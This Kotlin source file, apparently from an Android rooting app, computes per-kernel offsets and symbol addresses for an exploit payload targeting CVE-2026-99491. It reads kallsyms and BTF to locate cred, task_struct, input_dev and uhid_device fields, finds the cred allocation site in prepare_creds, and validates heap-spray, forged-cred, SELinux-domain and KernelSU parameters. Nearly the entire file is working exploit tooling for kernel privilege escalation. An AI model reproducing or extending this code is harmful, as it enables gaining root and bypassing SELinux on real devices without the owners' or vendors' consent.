package com.extractkit.app

/**
 * 9.353：把一台内核的 BTF + kallsyms 折成 EK-W1（CVE-2026-99491）payload 直接能吃的 profile JSON。
 *
 * 为什么需要它：payload 的 profile 是 105 个键的扁平 JSON，其中 8 个是符号地址、三十多个是结构体偏移、
 * 还有 cred 分配点的低 21 位与 cap 位图。这些值过去全部写死在 assets/payload/wacom/profile-6.6.json 里，
 * 只对 g554929766a0d 那一颗成立 —— 换一颗同族内核（比如 ga812a1946391）就得手工抄常量。
 * 标定页现在自己算：BTF 给结构体偏移，kallsyms 给符号地址，镜像里的 cap_last_cap 变量给 cap 位图，
 * prepare_creds 里的第一条 BL 给 cred 分配点。模板只提供键序、键名、引号风格和那些推不出来的东西
 * （uhid oracle 槽位、spray 参数、包名/路径等）。
 *
 * 三条纪律：
 *   1. 只改模板里已经存在的键，绝不新增键（payload 的 profile_validate 对未知键沉默，
 *      但缺一个已知键就直接 missing profile key 退出）。
 *   2. 推不出来的值保留模板原值并写 note —— 不猜。
 *   3. 出厂前跑一遍 [validate]，把 payload 侧 profile_validate 的硬条件在 App 里先过一遍，
 *      这样「标定成功但一跑就被拒」不会发生。
 */
internal object WacomCalib {

    /** 结果：[json] 是可直接下发的 profile，[problems] 非空即不合格。 */
    data class Built(
        val json: String,
        val derived: Int,
        val problems: List<String>,
        val notes: List<String>,
    ) {
        val ok: Boolean get() = problems.isEmpty()
    }

    /** profile 的 sym_* 键 ←→ kallsyms 里的名字（第一个命中即用）。 */
    private val SYM_KEYS: Map<String, List<String>> = linkedMapOf(
        "sym_uhid_worker" to listOf("uhid_device_add_worker", "uhid_add_worker"),
        "sym_inject_event" to listOf("input_inject_event"),
        "sym_selinux_state" to listOf("selinux_state"),
        "sym_init_cred" to listOf("init_cred"),
        "sym_per_cpu_offset" to listOf("__per_cpu_offset"),
        "sym_runqueues" to listOf("runqueues"),
        "sym_input_dev_list" to listOf("input_dev_list"),
    )

    /** cred 分配点的目标函数：prepare_creds 里 BL 到其中任意一个，返回地址就定了 site。 */
    private val ALLOC_SYMS = listOf(
        "kmem_cache_alloc",
        "kmem_cache_alloc_noprof",
        "kmem_cache_zalloc",
        "kmem_cache_alloc_trace",
        "kmem_cache_alloc_trace_noprof",
        "__kmem_cache_alloc_node",
    )

    /** JSON 里引号的字面量，避开各层转义地狱。 */
    private val Q: String = 34.toChar().toString()

    /** 只放行 json 字符串里安全可见的字符：release 串、label 这类值都来自内核镜像，不能带引号反斜杠。 */
    private fun printable(v: String): String = v.filter {
        it.isLetterOrDigit() || it == 46.toChar() || it == 45.toChar() || it == 95.toChar() ||
            it == 43.toChar() || it == 32.toChar() || it == 58.toChar() || it == 47.toChar() ||
            it == 40.toChar() || it == 41.toChar() || it == 64.toChar() || it == 94.toChar()
    }

    /**
     * 组 profile。
     *
     * @param template assets 里那份 profile-6.6.json 的原文（键序、缩进、引号风格都从它继承）
     * @param release  boot 里读到的内核版本串（payload 用 uname() 全串比较，必须一模一样）
     * @param image    kernel 段的原始字节（file_off = va - relativeBase）
     * @param symbols  kallsyms 结果（名字 -> 绝对地址）
     * @param btf      镜像内嵌 BTF；null 时结构体偏移无从推导，直接不合格
     * @param credSiteOverride 高级面板手填的 cred 分配点低 21 位，非 0 时优先
     */
    fun build(
        template: String,
        release: String,
        pageSize: Int,
        image: ByteArray,
        relativeBase: Long,
        symbols: Map<String, Long>,
        btf: Btf?,
        credSiteOverride: Int = 0,
    ): Built {
        val parsed = entries(template)
        if (parsed.isEmpty()) {
            return Built(template, 0, listOf("template is not a flat JSON object"), emptyList())
        }
        val problems = ArrayList<String>()
        val notes = ArrayList<String>()
        val old = LinkedHashMap<String, String>()
        for (e in parsed) if (!old.containsKey(e.key)) old[e.key] = e.token
        val next = LinkedHashMap<String, String>()

        fun put(key: String, token: String) {
            if (!old.containsKey(key)) {
                problems.add("template is missing key " + key)
                return
            }
            next[key] = token
        }

        fun putNum(key: String, v: Long) = put(key, v.toString())

        fun putStr(key: String, v: String) = put(key, Q + printable(v) + Q)

        fun putHex(key: String, v: Long) = put(key, Q + "0x" + java.lang.Long.toHexString(v) + Q)

        // ---- 与内核无关的身份字段 ----------------------------------------------
        putNum("format", 1)
        putStr("arch", "arm64")
        putNum("page_size", pageSize.toLong())
        if (release.isBlank() || release == "?") {
            problems.add("kernel release string is empty; the payload compares uname() exactly")
        } else {
            putStr("release", release)
            putStr("label", "in-app " + release.take(64))
        }

        // ---- 符号地址：kallsyms ------------------------------------------------
        for ((key, names) in SYM_KEYS) {
            var addr = 0L
            for (n in names) {
                val v = symbols[n] ?: 0L
                if (v != 0L) {
                    addr = v
                    break
                }
            }
            if (addr == 0L) {
                problems.add("symbol " + names[0] + " not in kallsyms (needed for " + key + ")")
            } else {
                putHex(key, addr)
            }
        }

        // ---- 结构体偏移：BTF ---------------------------------------------------
        if (btf == null) {
            problems.add("this image carries no BTF: struct offsets cannot be derived")
        } else {
            fun size(struct: String, key: String) {
                val v = btf.sizeOf(struct)
                if (v == null) problems.add("BTF has no struct " + struct + " (needed for " + key + ")")
                else putNum(key, v.toLong())
            }

            fun off(struct: String, member: String, key: String) {
                val v = btf.memberOffset(struct, member)
                if (v == null) problems.add("BTF " + struct + "." + member + " missing (needed for " + key + ")")
                else putNum(key, v.toLong())
            }

            /** 老内核可能连这个成员都没有（比如 6.6 加了 inhibited），缺了就保留模板值。 */
            /** 6.12 起部分成员改名（events -> handle_events），两个名字都认，都没有才退回模板值。 */
            fun aliasSoft(struct: String, a: String, b: String, key: String) {
                val v = btf.memberOffset(struct, a) ?: btf.memberOffset(struct, b)
                if (v == null) notes.add("BTF " + struct + "." + a + "/" + b + " missing; template value kept for " + key)
                else putNum(key, v.toLong())
            }

            fun offSoft(struct: String, member: String, key: String) {
                val v = btf.memberOffset(struct, member)
                if (v == null) notes.add("BTF " + struct + "." + member + " missing; template value kept for " + key)
                else putNum(key, v.toLong())
            }

            size("cred", "cred_req")
            size("cred", "cred_bytes")
            off("cred", "uid", "cred_uid_off")
            off("cred", "euid", "cred_euid_off")
            off("cred", "securebits", "cred_securebits_off")
            off("cred", "cap_permitted", "cred_cap_permitted_off")
            off("cred", "cap_effective", "cred_cap_effective_off")
            off("cred", "cap_bset", "cred_cap_bset_off")
            off("cred", "security", "cred_security_off")
            off("cred", "user", "cred_user_off")
            off("cred", "user_ns", "cred_user_ns_off")
            off("cred", "rcu", "cred_rcu_off")
            // 6.13 changed struct rcu_head to struct callback_head; the header type is what the
            // kernel actually embeds, so look for both names before falling back.
            val rcu = btf.sizeOf("rcu_head") ?: btf.sizeOf("callback_head")
            if (rcu != null) putNum("cred_rcu_size", rcu.toLong())
            else notes.add("BTF has no rcu_head/callback_head; template value kept for cred_rcu_size")

            off("task_struct", "cred", "ts_off_cred")
            off("task_struct", "real_cred", "ts_off_real_cred")
            off("task_struct", "comm", "ts_off_comm")
            off("rq", "curr", "rq_off_curr")
            off("rq", "idle", "rq_off_idle")

            size("input_dev", "input_dev_size")
            off("input_dev", "evbit", "input_dev_evbit_off")
            off("input_dev", "swbit", "input_dev_swbit_off")
            off("input_dev", "grab", "input_dev_grab_off")
            off("input_dev", "event_lock", "input_dev_event_lock_off")
            off("input_dev", "num_vals", "input_dev_num_vals_off")
            off("input_dev", "max_vals", "input_dev_max_vals_off")
            off("input_dev", "vals", "input_dev_vals_off")
            off("input_dev", "absbit", "input_dev_absbit_off")
            off("input_dev", "absinfo", "input_dev_absinfo_off")
            offSoft("input_dev", "event", "input_dev_event_off")
            // 内核里叫 h_list（list_head），个别构建裁成 hlist，两种名字都认。
            val hl = btf.memberOffset("input_dev", "h_list") ?: btf.memberOffset("input_dev", "hlist")
            if (hl == null) problems.add("BTF input_dev.h_list missing (needed for input_dev_hlist_off)")
            else putNum("input_dev_hlist_off", hl.toLong())
            offSoft("input_dev", "inhibited", "input_dev_inhibited_off")
            off("input_dev", "id", "input_dev_id_off")
            off("input_dev", "node", "input_dev_node_off")

            size("input_absinfo", "absinfo_size")
            size("input_handle", "input_handle_size")
            off("input_handle", "dev", "input_handle_dev_off")
            off("input_handle", "handler", "input_handle_handler_off")
            // 6.12 renamed input_handle.events to handle_events (see upstream adapt.py).
            aliasSoft("input_handle", "events", "handle_events", "input_handle_events_off")
            offSoft("input_handler", "event", "input_handler_event_off")

            // ---- uhid_device 的几何：以前这一组是 6.6 模板里的常量，从不重算 ----
            // 9.419：泄漏/写入全落在 struct uhid_device 的成员偏移上，必须按本机 BTF 推：
            //   uhid_waitq_self      = offsetof(uhid_device, waitq) + offsetof(wait_queue_head, head)
            //                          （init_waitqueue_head() 让 head.next/prev 自指，泄漏到的 32 位
            //                            正好是 base + 这个偏移，所以它是整条链的定锚点）
            //   uhid_outq_off        = 类型为 struct uhid_event * 的那个成员的偏移（disarm 写 8 个零 = 置 NULL）
            //   uhid_waitq_head_off  = outq 前一格（payload 在这里写 p0 的低 32 位，和 pchain_read64 的 -2 同源）
            //   uhid_worker_off      = 内嵌 struct work_struct 的偏移
            //   uhid_worker_func_off = uhid_worker_off + offsetof(work_struct, func)（泄漏到的函数指针 = uhid_worker）
            val ud = btf.struct("uhid_device")
            if (ud == null) {
                notes.add("BTF has no struct uhid_device; uhid_* kept from the template")
            } else {
                val waitq = ud.members.firstOrNull { m ->
                    val t = btf.strip(m.typeId)
                    t != null && t.kind == 4 && t.name == "wait_queue_head"
                } ?: ud.members.firstOrNull { it.name == "waitq" }
                val headOff = btf.memberOffset("wait_queue_head", "head")
                if (waitq != null && headOff != null) {
                    putNum("uhid_waitq_self", (waitq.byteOffset + headOff).toLong())
                } else {
                    notes.add("uhid_device.waitq / wait_queue_head.head not in BTF; template value kept for uhid_waitq_self")
                }

                val outq = ud.members.firstOrNull { btf.pointedName(it.typeId) == "uhid_event" }
                    ?: ud.members.firstOrNull { it.name == "outq" }
                if (outq != null) {
                    putNum("uhid_outq_off", outq.byteOffset.toLong())
                    putNum("uhid_waitq_head_off", (outq.byteOffset - 4).toLong())
                } else {
                    notes.add("uhid_device has no struct uhid_event * member; template value kept for uhid_outq_off")
                }

                val worker = ud.members.firstOrNull { m ->
                    val t = btf.strip(m.typeId)
                    t != null && t.kind == 4 && t.name == "work_struct"
                } ?: ud.members.firstOrNull { it.name == "worker" }
                if (worker != null) {
                    putNum("uhid_worker_off", worker.byteOffset.toLong())
                    val funcOff = btf.memberOffset("work_struct", "func")
                    if (funcOff != null) {
                        putNum("uhid_worker_func_off", (worker.byteOffset + funcOff).toLong())
                    } else {
                        notes.add("work_struct.func not in BTF; template value kept for uhid_worker_func_off")
                    }
                } else {
                    notes.add("uhid_device has no struct work_struct member; template value kept for uhid_worker_off")
                }

                // 重算出来的值与模板不一样时，必须明说（这正是 6.12 那条自我检查的由来）。
                for (k in UHID_KEYS) {
                    val a = old[k]?.let { numOf(it) } ?: continue
                    val b = next[k]?.let { numOf(it) } ?: continue
                    if (a != b) {
                        notes.add("recomputed " + k + " = " + b + " (the 6.6 template said " + a + ")")
                    }
                }
            }
        }

        // ---- cap 位图：内核里的 cap_last_cap 变量就是答案（不是编译期常量表） -----
        val capVa = symbols["cap_last_cap"] ?: 0L
        if (capVa == 0L) {
            problems.add("symbol cap_last_cap not in kallsyms")
        } else {
            val fo = capVa - relativeBase
            val n = if (fo >= 0 && fo + 4 <= image.size) u32(image, fo.toInt()) else -1
            if (n < 1 || n > 62) {
                problems.add("cap_last_cap at 0x" + java.lang.Long.toHexString(capVa) + " reads " + n + ", expected 1..62")
            } else {
                putNum("cap_last_cap", n.toLong())
                putNum("cap_full_mask", (1L shl (n + 1)) - 1)
            }
        }

        // ---- cred 分配点：prepare_creds 里第一条 BL -> kmem_cache_alloc*，取 pc+4 低 21 位 ---
        val site = if (credSiteOverride != 0) credSiteOverride else credAllocSite(image, relativeBase, symbols)
        if (site == 0) {
            // ThinLTO 把 cred_jar 的 slab 分配内联进 prepare_creds 时，函数里没有 BL 形状可言。
            // 这不是致命错误：oracle 关掉，链路退到确定性回收（6.6 真机每次也是这条路）。
            putNum("cred_site_low21", 0L)
            notes.add("cred alloc site not found (slab path inlined); the kmem oracle stays off and the chain falls back to deterministic reclaim")
        } else {
            putNum("cred_site_low21", site.toLong())
            if (credSiteOverride != 0) notes.add("cred_site_low21 taken from the advanced field")
        }

        val json = render(template, next)
        // 报告「用镜像算出来并写回去的键数」。同一颗内核常常与模板逐字一致，
        // 那也是 60 来个键都重新验过一遍，不能显示成 1。
        val derived = next.size
        var changed = 0
        for ((k, v) in next) if (old[k] != v) changed++
        val merged = ArrayList<String>(problems)
        merged.addAll(validate(json))
        if (changed < derived) notes.add("" + changed + " of " + derived + " keys differ from the template")
        return Built(json, derived, merged.distinct(), notes.distinct())
    }

    /** 9.419：这几个键必须按本机 BTF 重算，不能继续吃模板值。 */
    private val UHID_KEYS = listOf(
        "uhid_waitq_self",
        "uhid_waitq_head_off",
        "uhid_outq_off",
        "uhid_worker_off",
        "uhid_worker_func_off",
    )

    /** payload 的 profile_validate 会为这些字符串逐个报 missing profile key。 */
    private val REQUIRED_STRINGS = listOf(
        "cve",
        "ksu_manager",
        "ksu_manager_apk_root",
        "ksu_workdir",
        "ksu_module_name",
        "ksu_ksud_name",
        "ksu_ksud_path",
        "ksu_ksu_bin_dir",
        "ksu_modules_dir",
        "ksu_lib_subpath",
        "ksu_lib_subpath_v8a",
    )

    /**
     * 与 payload 的 `profile_validate` 等价的硬条件。
     *
     * 那边是 C 里的 if 链，任何一条不过都只打一行 `invalid profile key` 就把 uid=0 子进程退掉；
     * 这里提前跑一遍，标定页就能直接说「合格 / 不合格 + 哪一条」。
     */
    fun validate(json: String): List<String> {
        val parsed = entries(json)
        if (parsed.isEmpty()) return listOf("profile is not a flat JSON object")
        val m = LinkedHashMap<String, String>()
        for (e in parsed) if (!m.containsKey(e.key)) m[e.key] = e.token
        val p = ArrayList<String>()

        fun num(key: String): Long? = m[key]?.let { numOf(it) }

        fun need(key: String): Long {
            val v = num(key)
            if (v == null) p.add("missing or non-numeric: " + key)
            return v ?: 0L
        }

        fun text(key: String): String {
            val v = unquote(m[key] ?: "").trim()
            if (v.isEmpty()) p.add("missing string: " + key)
            return v
        }

        fun inRange(key: String, v: Long, lo: Long, hi: Long) {
            if (v < lo || v > hi) p.add(key + " must be " + lo + ".." + hi + " (got " + v + ")")
        }

        /** 字段必须整块落在 [limit] 之内（越界就是写到别人头上）。 */
        fun fits(key: String, width: Long, limit: Long) {
            val v = need(key)
            if (v < 0 || v + width > limit) {
                p.add(key + " does not fit: offset " + v + " + width " + width + " > " + limit)
            }
        }

        if (need("format") != 1L) p.add("format must be 1")
        val arch = text("arch")
        if (arch.isNotEmpty() && arch != "arm64" && arch != "aarch64") p.add("arch must be arm64 or aarch64")
        inRange("page_size", need("page_size"), 4096, 65536)
        text("release")

        // cred：每个字段都得落在 cred 里面
        val credBytes = need("cred_bytes")
        inRange("cred_bytes", credBytes, 1, 256)
        fits("cred_uid_off", 4, credBytes)
        fits("cred_euid_off", 4, credBytes)
        fits("cred_securebits_off", 4, credBytes)
        fits("cred_cap_permitted_off", 8, credBytes)
        fits("cred_cap_effective_off", 8, credBytes)
        fits("cred_cap_bset_off", 8, credBytes)
        fits("cred_security_off", 8, credBytes)
        fits("cred_user_off", 8, credBytes)
        fits("cred_user_ns_off", 8, credBytes)
        fits("cred_rcu_off", need("cred_rcu_size"), credBytes)

        // 三块伪造区都在 4096 B 的 anchor 里
        val devSize = need("input_dev_size")
        if (need("c_off_d") + devSize > 4096) p.add("c_off_d + input_dev_size runs past the 4096 B anchor")
        if (need("c_off_e") + 16 > 4096) p.add("c_off_e + input_handle runs past the 4096 B anchor")
        if (need("c_off_fake") + credBytes > 4096) p.add("c_off_fake + cred_bytes runs past the 4096 B anchor")

        // input_dev / input_handle 各字段宽度
        fits("input_dev_evbit_off", 8, devSize)
        fits("input_dev_swbit_off", 8, devSize)
        fits("input_dev_grab_off", 8, devSize)
        fits("input_dev_event_lock_off", 4, devSize)
        fits("input_dev_num_vals_off", 4, devSize)
        fits("input_dev_max_vals_off", 4, devSize)
        fits("input_dev_vals_off", 8, devSize)
        fits("input_dev_absbit_off", 8, devSize)
        fits("input_dev_absinfo_off", 8, devSize)
        fits("input_dev_event_off", 8, devSize)
        fits("input_dev_hlist_off", 16, devSize)
        fits("input_dev_inhibited_off", 1, devSize)
        fits("input_dev_id_off", 8, devSize)
        fits("input_dev_node_off", 16, devSize)
        val hSize = need("input_handle_size")
        fits("input_handle_dev_off", 8, hSize)
        fits("input_handle_handler_off", 8, hSize)
        fits("input_handle_events_off", 8, hSize)

        // selinux_state 头 4 字节：enforcing / initialized 的字节偏移
        val enf = need("selinux_enforcing_off")
        val ini = need("selinux_initialized_off")
        if (enf < 0 || enf > ini || ini >= 4) p.add("selinux enforcing/initialized offsets look wrong")

        // cap 位图必须与 cap_last_cap 自洽
        val last = need("cap_last_cap")
        inRange("cap_last_cap", last, 1, 62)
        val mask = need("cap_full_mask")
        if (last >= 1 && last <= 62 && mask != (1L shl (last.toInt() + 1)) - 1) {
            p.add("cap_full_mask must be (1 << (cap_last_cap + 1)) - 1")
        }

        // uhid oracle 的槽位下标按 4 字节步进
        val waitq = need("uhid_waitq_self")
        val serial = need("uhid_serial_read_base_off")
        if (serial > waitq) p.add("uhid_serial_read_base_off is past uhid_waitq_self")
        else if ((waitq - serial) % 4L != 0L) p.add("uhid_waitq_self - uhid_serial_read_base_off must be a multiple of 4")
        val workerOff = need("uhid_worker_off")
        val workerFunc = need("uhid_worker_func_off")
        if (workerFunc < workerOff || workerFunc < serial) p.add("uhid_worker_func_off sits before its anchors")
        else if ((workerFunc - serial) % 4L != 0L) p.add("uhid_worker_func_off - uhid_serial_read_base_off must be a multiple of 4")

        // 9.419：几何关系（与模板无关，重算后必须仍成立）
        val outqOff = need("uhid_outq_off")
        val headOff = need("uhid_waitq_head_off")
        if (outqOff - headOff != 4L) {
            p.add("uhid_waitq_head_off must be uhid_outq_off - 4 (got " + headOff + " vs " + outqOff + ")")
        }
        if (waitq >= headOff) p.add("uhid_waitq_self must sit before uhid_waitq_head_off")
        val wgap = workerFunc - workerOff
        if (wgap < 8L || wgap > 96L) {
            p.add("uhid_worker_func_off must sit 8..96 bytes past uhid_worker_off (got " + wgap + ")")
        }

        // spray 预算
        inRange("spray_pairs", need("spray_pairs"), 1, 64)
        val sprayLen = need("spray_len")
        if (sprayLen < devSize) p.add("spray_len must be at least input_dev_size")
        val skb = need("spray_skb_req")
        if (skb != 0L && (skb < sprayLen || skb > 8192)) p.add("spray_skb_req must be 0, or between spray_len and 8192")
        inRange("spray_burst_min", need("spray_burst_min"), 32, 65536)
        inRange("spray_burst_step", need("spray_burst_step"), 8, 4096)
        inRange("spray_wait_ms", need("spray_wait_ms"), 0, 5000)
        inRange("spray_hold_wait_ms", need("spray_hold_wait_ms"), 0, 10000)
        inRange("spray_fill", need("spray_fill"), 1, 4096)
        inRange("spray_trigger_rounds", need("spray_trigger_rounds"), 1, 16)
        inRange("spray_respray_rounds", need("spray_respray_rounds"), 1, 64)
        inRange("spray_cpu", need("spray_cpu"), 0, 63)

        // SELinux 域：payload 直接把它丢给 setcon
        val dom = text("selinux_shell_domain")
        if (dom.isNotEmpty()) {
            val body = if (dom.length > 7) dom.substring(4, dom.length - 3) else ""
            val okDomain = dom.length >= 8 && dom.startsWith("u:r:") && dom.endsWith(":s0") &&
                body.all { it.isLetterOrDigit() || it == 46.toChar() || it == 95.toChar() }
            if (!okDomain) p.add("selinux_shell_domain must look like u:r:<name>:s0")
        }

        // binder 取包名：三个 txn 号要么全给，要么全不给
        val lib = unquote(m["pm_binder_lib"] ?: "").trim()
        val svc = unquote(m["pm_service"] ?: "").trim()
        val iface = unquote(m["pm_interface"] ?: "").trim()
        val txnApp = num("pm_txn_get_application_info") ?: 0L
        val txnPkg = num("pm_txn_get_package_info") ?: 0L
        val pmUser = num("pm_user_id") ?: 0L
        if (lib.isNotEmpty() || svc.isNotEmpty() || iface.isNotEmpty() || txnApp != 0L || txnPkg != 0L) {
            if (lib.isEmpty() || svc.isEmpty() || iface.isEmpty()) {
                p.add("pm_binder_lib / pm_service / pm_interface must all be set")
            }
            if (txnApp < 1 || txnApp > 0xffff) p.add("pm_txn_get_application_info must be 1..65535")
            if (txnPkg < 1 || txnPkg > 0xffff) p.add("pm_txn_get_package_info must be 1..65535")
            if (pmUser < 0 || pmUser > 999) p.add("pm_user_id must be 0..999")
        }

        // 符号地址是 payload 直接用的绝对地址，缺一个都跑不到 slide
        for (k in SYM_KEYS.keys) {
            if ((num(k) ?: 0L) == 0L) p.add("symbol address missing: " + k)
        }
        for (k in REQUIRED_STRINGS) text(k)

        return p.distinct()
    }

    // ---- 模板文本 <-> (key, token) 表 -----------------------------------------------

    private class Entry(val key: String, val token: String, val start: Int, val end: Int)

    private fun unquote(raw: String): String {
        val t = raw.trim()
        if (t.length >= 2 && t[0] == 34.toChar() && t[t.length - 1] == 34.toChar()) {
            return t.substring(1, t.length - 1)
        }
        return t
    }

    /**
     * 扫出模板里所有 `"key": <token>`，token 是带引号的字符串或数字。
     * 手写扫描而不是正则：payload 的 JSON 缩进固定，扫描比一路转义的正则更好读。
     */
    private fun entries(text: String): List<Entry> {
        val list = ArrayList<Entry>()
        var i = 0
        while (i < text.length) {
            val open = text.indexOf(34.toChar(), i)
            if (open < 0) break
            val close = text.indexOf(34.toChar(), open + 1)
            if (close < 0) break
            val key = text.substring(open + 1, close)
            var j = close + 1
            while (j < text.length && text[j].isWhitespace()) j++
            if (j >= text.length || text[j] != 58.toChar()) {
                i = close + 1
                continue
            }
            j++
            while (j < text.length && text[j].isWhitespace()) j++
            val start = j
            var end = -1
            if (j < text.length && text[j] == 34.toChar()) {
                var k = j + 1
                while (k < text.length) {
                    val c = text[k]
                    if (c == 92.toChar()) k += 2
                    else if (c == 34.toChar()) {
                        k++
                        break
                    } else {
                        k++
                    }
                }
                end = k
            } else {
                var k = j
                while (k < text.length && isNumChar(text[k])) k++
                end = k
            }
            if (end > start) {
                list.add(Entry(key, text.substring(start, end), start, end))
                i = end
            } else {
                i = close + 1
            }
        }
        return list
    }

    private fun isNumChar(c: Char): Boolean =
        c.isDigit() || c.code == 120 || c.code == 88 || (c.code in 97..102) || (c.code in 65..70)

    /** 只替换 [next] 里给出的键的 token，其余字节（缩进、换行、引号风格）原样保留。 */
    private fun render(template: String, next: Map<String, String>): String {
        if (next.isEmpty()) return template
        val sb = StringBuilder(template.length + 64)
        var cursor = 0
        for (e in entries(template)) {
            val token = next[e.key] ?: continue
            sb.append(template, cursor, e.start)
            sb.append(token)
            cursor = e.end
        }
        sb.append(template, cursor, template.length)
        return sb.toString()
    }

    private fun numOf(token: String): Long? {
        val t = unquote(token)
        if (t.isEmpty()) return null
        val neg = t[0] == 45.toChar()
        val body = if (neg) t.substring(1) else t
        if (body.isEmpty()) return null
        val hex = body.length > 2 && body[0] == 48.toChar() && (body[1] == 120.toChar() || body[1] == 88.toChar())
        // 符号地址是内核态指针（0xffffffc0... ），按有符号 Long 读会溢出，必须用无符号解析。
        val v = try {
            if (hex) {
                val b = body.substring(2)
                try {
                    java.lang.Long.parseLong(b, 16)
                } catch (e2: NumberFormatException) {
                    java.lang.Long.parseUnsignedLong(b, 16)
                }
            } else {
                java.lang.Long.parseLong(body, 10)
            }
        } catch (e: NumberFormatException) {
            return null
        }
        return if (neg) -v else v
    }

    private fun u32(b: ByteArray, off: Int): Int =
        (b[off].toInt() and 0xFF) or
            ((b[off + 1].toInt() and 0xFF) shl 8) or
            ((b[off + 2].toInt() and 0xFF) shl 16) or
            ((b[off + 3].toInt() and 0xFF) shl 24)

    /**
     * `prepare_creds` 里第一条 BL 到 kmem_cache_alloc 家族，它的返回地址就是 cred 分配点，
     * payload 只拿低 21 位做对照（同一 2 MiB 段内地址低 21 位不变）。
     * 实测 g554929766a0d：BL 在 0xffffffc080238454，返回 0xffffffc080238458，低 21 位 = 0x38458。
     */
    private fun credAllocSite(image: ByteArray, base: Long, symbols: Map<String, Long>): Int {
        val fn = symbols["prepare_creds"] ?: symbols["prepare_kernel_cred"] ?: return 0
        val alloc = HashSet<Long>()
        for (n in ALLOC_SYMS) {
            val v = symbols[n] ?: 0L
            if (v != 0L) alloc.add(v)
        }
        if (alloc.isEmpty()) return 0
        val limit = minOf(nextSymbolAfter(symbols, fn), fn + 0x4000)
        var pc = fn
        while (pc + 4 <= limit) {
            val fo = pc - base
            if (fo < 0 || fo + 4 > image.size) return 0
            val w = u32(image, fo.toInt())
            if ((w and -0x04000000) == -0x6C000000) {
                val off = ((w shl 6) shr 4).toLong()
                if (alloc.contains(pc + off)) return ((pc + 4) and 0x1FFFFF).toInt()
            }
            pc += 4
        }
        return 0
    }

    private fun nextSymbolAfter(symbols: Map<String, Long>, addr: Long): Long {
        var best = Long.MAX_VALUE
        for (v in symbols.values) if (v > addr && v < best) best = v
        return if (best == Long.MAX_VALUE) addr + 0x4000 else best
    }
}